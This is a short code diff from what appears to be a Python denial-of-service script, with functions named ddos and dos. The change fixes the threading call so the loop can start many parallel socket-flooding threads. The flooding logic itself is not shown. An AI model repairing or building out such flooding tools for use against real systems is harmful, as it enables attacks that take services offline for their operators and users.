@@ -47,7 +47,7 @@ def ddos():
          mysocket.close()
 
    for i in range(threads):
-      t = Thread(target=dos)
+      t = threading.Thread(target=dos)
       t.start()
 
 
